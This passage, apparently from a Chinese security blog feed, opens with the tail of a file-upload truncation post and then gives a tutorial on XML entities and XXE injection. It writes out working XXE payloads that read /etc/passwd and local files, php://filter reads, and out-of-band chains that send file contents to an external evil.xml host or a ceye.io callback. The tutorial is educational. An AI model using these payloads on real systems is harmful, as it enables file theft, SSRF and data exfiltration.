加不加反斜杠都无所谓，只要为file[1]=0即可
必须先save_name[0]再save_name[2]
唯一不懂的点：
1.count不是返回数组数目吗，count算了一下有0 1 2 三个元素 那么3-1=2 那么返回的为什么是file[1]而不是2
截断上传漏洞原理：http://salt-neko.com/2019/10/27/%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/



<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210105224221.png" alt="img" style="zoom: 80%;">
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>xml注入与xxe注入基础知识</title>
    <url>/2021/04/10/xml%E6%B3%A8%E5%85%A5%E4%B8%8Exxe%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h2 id="xml定义"><a href="#xml定义" class="headerlink" title="xml定义"></a>xml定义</h2><p>xml由三个部分构成，它们分别是:文档类型定义(dtd)、即xml的布局语言；可拓展的样式语言即xml的样式表语言(xsl)；以及可拓展链接语言(XLL);<a id="more"></a><br><strong>xml</strong>：可拓展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。它被设计用来传输和存储数据，而不是储存数据；可拓展标记语言是一种很像超文本标记语言的标记语言。它的设计宗旨是传输数据，而不是显示数据。它的标签没有被预定义。需要自行定义<br><strong>可扩展标记语言(XML)和超文本标记语言(HTML)为不同的目的而设计<br>它被设计用来传输和存储数据，其焦点是数据的内容。<br>超文本标记语言被设计用来显示数据，其焦点是数据的外观</strong></p>
<h2 id="xml作用"><a href="#xml作用" class="headerlink" title="xml作用"></a>xml作用</h2><p>XML使用元素和属性来描述数据。在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。使用XML做数据交换可以使应用程序更具有弹性，因为可以用位置(与普通文件一样)或用元素名(从数据库)来存取XML数据。                                                                                                   </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ⬆XML声明⬆ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE  文件名 [</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY实体名 <span class="meta-string">&quot;实体内容&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ⬆文档类型定义(DTD)⬆ --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">元素名称</span> <span class="attr">category</span>=<span class="string">&quot;属性&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">文本或其他元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">元素名称</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ⬆文档元素⬆ --&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="xml格式说明"><a href="#xml格式说明" class="headerlink" title="xml格式说明"></a>xml格式说明</h2><p>xml用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML生命、DTD文档类型定义(可选)、文档元素。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span>#xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span>#文档类型定义</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  #文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">Ffrom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span>     </span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD（文档类型定义）的作用是定义XML文档的合法构建模块、DTF可以在xml文档内生命，也可以外部引用。</p>
<p>（1）内部声明DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>（2）引用外部DTD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 system &quot;文件名&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot;&quot;文件名&quot;&gt;</span><br><span class="line">DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用</span><br></pre></td></tr></table></figure>

<p>（3）DTD的实体<br><strong>作用</strong>：DTD（文档类型定义）的作用是定义xml文档的合法构建模块。DTD可以在xml文档内声明，也可以外部引用。</p>
<p>外部实体是指XML处理器必须解析的数据。它对于在多个文档之间创建共享的公共引用很有用。对外部实体进行的任何更改将在包含对其的应用的文档中，自动更新。即xml使用外部实体将信息或“内容”将自动提取到xml文档的正文中。为此，我们需要在xml文档内部声明一个外部实体<br><strong>DTD实体适用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。。</strong>我们可以在内部确定其值（内部子集）：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">AppSec</span> <span class="meta-string">&quot;Appsec-Labs&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>或从外部来源(外部子集):</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">AppSec</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://site.com/some_content/html&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>SYSTEM标识符：</strong>该标识符意味着该实体将从外部来源获取内容，在本例中，该内容是“site.com”下的一个页面。</p>
<p>为了声明这些实体，我们需要在文档类型定义（DTD）中进行。DTD是一组标记声明，用于定义XML的文档类型。它定义了XML文档的合法结构块和具有合法元素和属性列表的文档结构。DTD可以在XML文档内部声明，也可以作为外部引用声明—使用SYSTEM标识符指向可解析位置中的另一组声明。ENTITY可以使用SYSTEM关键字,调用外部资源,而这里是支持很多的协议,如:http;file等，然后,在其他DoM结点中可以使用如:&test;引用该实体内容.</p>
<p>那么,如果在产品功能设计当中,解析的xml是由外部可控制的,那将可能形成,如:文件读取,DoS,CSRF等漏洞.</p>
<p>如果要引用一个外部资源,可以借助各种协议 几个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file.ext</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php</span><br></pre></td></tr></table></figure>

<p>我们来看一个DTD的例子，一个在DTD里面有一个SYSTEM标识符的实体：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Author[</span><br><span class="line">&lt;!ENTITY app SYSTEM &quot;http:&#x2F;&#x2F;site.com&#x2F;some_conten.html&quot;&gt;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h4 id="l-内部声明实体"><a href="#l-内部声明实体" class="headerlink" title="l 内部声明实体"></a>l 内部声明实体</h4><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>一个内部实体声明</p>
<!ENTITY 实体名称 "实体的值">

<p>例子</p>
<p>DTD:</p>
<!ENTITY writer "me">

<p>XML:</p>
<p><author>&writer;</author></p>
<p>注释: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p>
<h4 id="l-引用外部实体"><a href="#l-引用外部实体" class="headerlink" title="l 引用外部实体"></a>l 引用外部实体</h4><p>一个外部实体声明</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>例子</p>
<p>DTD:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;dtd&#x2F;writer.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>

<p>外部实体类型有</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411142435.gif" alt="xxe"></p>
<h3 id="（4）CDATA"><a href="#（4）CDATA" class="headerlink" title="（4）CDATA"></a>（4）CDATA</h3><p>CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。</p>
<p>在 XML 元素中，”&lt;” （新元素的开始）和 “&amp;” （字符实体的开始）是非法的。</p>
<p>某些文本，比如 JavaScript 代码，包含大量 “&lt;” 或 “&amp;” 字符。为了避免错误，可以将脚本代码定义为 CDATA。</p>
<p>CDATA 部分中的所有内容都会被解析器忽略。</p>
<p>CDATA 部分由</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&lt;![CDATA[&quot; 开始，由 &quot;]]&gt;&quot;</span><br></pre></td></tr></table></figure>

<p> 结束</p>
<h2 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h2><p>XML的实体分为以下五种:字符实体、命名实体、外部实体、参数实体、内部实体、普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上<strong>SYSTEM关键字</strong>，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体代指内容为字符串。</p>
<h3 id="（1-）字符实体"><a href="#（1-）字符实体" class="headerlink" title="（1.）字符实体"></a>（1.）字符实体</h3><p>指用十进制格式(&#aaa;)或十六进制格式x;来指定任意Unicode字符。对XML解析器而言，字符实体与直接输入指定字符的效果完全相同。</p>
<h3 id="（2）命名实体"><a href="#（2）命名实体" class="headerlink" title="（2）命名实体"></a>（2）命名实体</h3><p>也称为内部实体，在DTD或内部子集（即文档中&lt;!DOCTYPE&gt;语句的一部分）中生命，在文档中用作引用。在xml文档解析过程中，实体引用将由它的表示替代</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot; &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;otherhost&#x2F;xxxx.php&quot; &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>可以用做xxe+ssrf</strong></p>
<h3 id="（3）外部实体"><a href="#（3）外部实体" class="headerlink" title="（3）外部实体"></a>（3）外部实体</h3><p>外部实体表示外部文件的内容，用 SYSTEM 关键词表示。</p>
<!ENTITY test SYSTEM "1.xml">

<p>有些XML文档包含system标识符定义的“实体”，这些文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE Anything [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY entityex SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;abc&gt;&amp;entityex;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取，并把读取的内容替换entityex出现的地方。</p>
<p>　　假如 SYSTEM 后面的内容可以被用户控制，那么用户就可以随意替换为其他内容，从而读取服务器本地文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd)或者远程文件（http:&#x2F;&#x2F;www.baidu.com&#x2F;abc.txt）</span><br></pre></td></tr></table></figure>

<h3 id="（4）参数实体"><a href="#（4）参数实体" class="headerlink" title="（4）参数实体"></a>（4）参数实体</h3><p>参数实体只用于DTD和文档的内部子集中，XML的规范定义中，只有在DTD中才能引用参数实体，参数实体的声明和引用都是以百分号%。并且参数实体的应用在DTD是理解解析的，替换文本将变成DTD的一部分。该类型的实体用“%”字符（或十六进制编码的%）声明，并且仅在经过解析和验证后才用于替换DTD中的文本或其他内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411143509.gif" alt="img"></p>
<!ENTITY % 实体名称 "实体的值">

<p>或者</p>
<!ENTITY % 实体名称 SYSTEM "URI">

<p>参数实体只能在 DTD文件中被引用，其他实体在XML文档内引用。<br>即下面实例，参数实体 在DOCTYPE内 ，其他实体在外</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % name SYSTEM “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure>


<p>%name;<br>]&gt;</p>
<p>参数实体在DTD中解析优先级高于xml内部实体</p>
<p>实体相当于变量 “file:///etc/passwd”赋值给name</p>
<p>先写一段简单的xml利用代码,以php为例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$data &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line"></span><br><span class="line">$xml &#x3D; simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;name;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">echo $xml-&gt;name;中-&gt;name</span><br></pre></td></tr></table></figure>

<h3 id="（5）内部实体"><a href="#（5）内部实体" class="headerlink" title="（5）内部实体"></a>（5）内部实体</h3><p>内置实体为预留的实体，如：</p>
<p>实体引用字符</p>
<p>&lt;     &lt;</p>
<p>&gt;      &gt;</p>
<p>&amp;     &amp;</p>
<p>&quot;     “</p>
<p>&apos;     ‘</p>
<p>而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p>
<p>关于实体嵌套的情况，比较幸运的是DTD中支持单双引号，所以可以通过单双引号间隔使用作为区分嵌套实体和实体之间的关系；在实际使用中，我们通常需要再嵌套一个参数实体，%号是需要处理成 &#37; 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;evil&#x2F;log?%payload;&quot; &gt;&#39;</span><br></pre></td></tr></table></figure>

<p>&#37;也可写为16进制&#x25;</p>
<p>另：内部实体的这支持与否也是取决于解释器的</p>
<h3 id="（6）命名实体-外部实体写法"><a href="#（6）命名实体-外部实体写法" class="headerlink" title="（6）命名实体+外部实体写法"></a>（6）命名实体+外部实体写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt;</span><br><span class="line">]&gt; </span><br><span class="line">&lt;value&gt;&amp;dtd;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>

<p>这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多</p>
<h3 id="（7）第一种命名实体-外部实体-参数实体写法"><a href="#（7）第一种命名实体-外部实体-参数实体写法" class="headerlink" title="（7）第一种命名实体+外部实体+参数实体写法"></a>（7）第一种命名实体+外部实体+参数实体写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;&#x2F;test&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt; </span><br><span class="line">%dtd; %all; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;value&gt;&amp;send;&lt;&#x2F;value&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.xml文件内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;localhost:88%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send</p>
<h3 id="（8）第二种命名实体-外部实体-参数实体写法"><a href="#（8）第二种命名实体-外部实体-参数实体写法" class="headerlink" title="（8）第二种命名实体+外部实体+参数实体写法"></a>（8）第二种命名实体+外部实体+参数实体写法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;test&#x2F;1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost:88&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>其中evil.xml文件内容为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;localhost:88&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>

<p>调用过程和第一种方法类似</p>
<h2 id="XML中的协议支持"><a href="#XML中的协议支持" class="headerlink" title="XML中的协议支持"></a>XML中的协议支持</h2><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210411145334.gif" alt="img"></p>
<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<h2 id="XXE注入定义"><a href="#XXE注入定义" class="headerlink" title="XXE注入定义"></a>XXE注入定义</h2><p>XXE注入，即XML 外部实体注入。通过XML实体，“SYSTEM”关键词导致XML解析器可以从本地文件或者远程URI中读取数据。所以攻击者可以通过XML实体传递自己构造的恶意值，是处理程序解析它。当应用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<p>ENTITY实体，在一个甚至多个XML文档中频繁使用某一条数据，我们预先定义一个这条数据的”别名”，即一个ENTITY，然后再这些文档中需要该数据的地方调用它。XML定义了两种类型的ENTITY，一种在XML文档中使用</p>
<p>若是在PHP中，若是在PHP中,libxml_disable_entity_loader设置为TRUE可禁用外部实体注。入另一种作为参数在DTD文件中使用。ENTITY的定义语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 文件名 [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">定义好的ENTITY在文档中通过“&amp;实体名;”来使用。举例：</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE booklist [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY publisher &quot;ABC company&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;booklist&gt;</span><br><span class="line"></span><br><span class="line">&lt;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;Ajax&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;price&gt;$5.95&lt;&#x2F;price&gt;</span><br><span class="line"></span><br><span class="line">&lt;description&gt;Foundations of Ajax.&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">&lt;publisher&gt;&amp;publisher;&lt;&#x2F;publisher&gt;  这里的&amp;publisher;会被“ABC company”替换</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;Ajax Patterns&lt;&#x2F;name&gt;</span><br><span class="line"></span><br><span class="line">&lt;price&gt;$7.95&lt;&#x2F;price&gt;</span><br><span class="line"></span><br><span class="line">&lt;description&gt;Introduction of Ajax Patterns.&lt;&#x2F;description&gt;</span><br><span class="line"></span><br><span class="line">&lt;publisher&gt;&amp;publisher;&lt;&#x2F;publisher&gt; 这里的&amp;publisher;会被“ABC company”替换</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;book&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;booklist&gt;</span><br></pre></td></tr></table></figure>

<p>在 XML 中有 5 个预定义的实体引用：</p>
<table>
<thead>
<tr>
<th>&lt;</th>
<th>&lt;</th>
<th>小于</th>
</tr>
</thead>
<tbody><tr>
<td>&gt;</td>
<td>&gt;</td>
<td>大于</td>
</tr>
<tr>
<td>&amp;</td>
<td>&amp;</td>
<td>和号</td>
</tr>
<tr>
<td>&apos;</td>
<td>‘</td>
<td>省略号</td>
</tr>
<tr>
<td>&quot;</td>
<td>“</td>
<td>引号</td>
</tr>
</tbody></table>
<p>注释：严格地讲，在 XML 中仅有字符 “&lt;”和”&amp;” 是非法的。省略号、引号和大于号是合法的，但是把它们替换为实体引用是个好的习惯。</p>
<h2 id="7-XXE漏洞原理"><a href="#7-XXE漏洞原理" class="headerlink" title="7.XXE漏洞原理"></a>7.XXE漏洞原理</h2><p>既然XML可以从外部读取DTD文件，那我们就自然地想到了如果将路径换成另一个文件的路径，那么服务器在解析这个XML的时候就会把那个文件的内容赋值给SYSTEM前面的根元素中，只要我们在XML中让前面的根元素的内容显示出来，不就可以读取那个文件的内容了。这就造成了一个任意文件读取的漏洞。</p>
<p>那如果我们指向的是一个内网主机的端口呢？是否会给出错误信息，我们是不是可以从错误信息上来判断内网主机这个端口是否开放，这就造成了一个内部端口被探测的问题。另外，一般来说，服务器解析XML有两种方式，一种是一次性将整个XML加载进内存中，进行解析；另一种是一部分一部分的、“流式”地加载、解析。如果我们递归地调用XML定义，一次性调用巨量的定义，那么服务器的内存就会被消耗完，造成了拒绝服务攻击。</p>
<h2 id="1-任意文件读取"><a href="#1-任意文件读取" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;&#x2F;phpStudy&#x2F;&#x2F;WWW&#x2F;&#x2F;aa.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>读取aa.txt的内容:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955047-1196767811.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<h2 id="2-探测sql盲注"><a href="#2-探测sql盲注" class="headerlink" title="2.探测sql盲注"></a>2.探测sql盲注</h2><p>一般在漏洞挖掘中我们是猜测不到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;root&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>里面是name标签的。所以我们用另一种方法更靠谱:推荐网站:<a href="http://ceye.io/payloads">http://ceye.io/payloads</a></p>
<p>找到网站上自带的XML注入利用代码:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955469-519270664.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>稍微整理下生成payload如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;9j4jd9.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&#x2F;&gt;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;9j4jd9.ceye.io&#x2F;xxe_test&quot;&gt;</span><br><span class="line"></span><br><span class="line">%remote;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&#x2F;&gt;</span><br></pre></td></tr></table></figure>

<p>看下现在是几点钟:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233955858-717215866.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p> 晚上八点多钟,我们复制payload发送请求:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233956543-443383052.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>看下网站里面自带的日志功能:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712233957447-1571114973.gif" alt="XML实体注入漏洞的简单利用和学习 - Blackhair - Blackhair的博客"></p>
<p>应该是时间延迟问题。反正相差十分钟以内!</p>
<p>这里接收到我们的payload请求说明是存在XML注入的，用这种方法测试XML注入我感觉很好</p>
<p>1.可以无限制盲打</p>
<p>2.测试简单方便不需要很繁琐测试猜测</p>
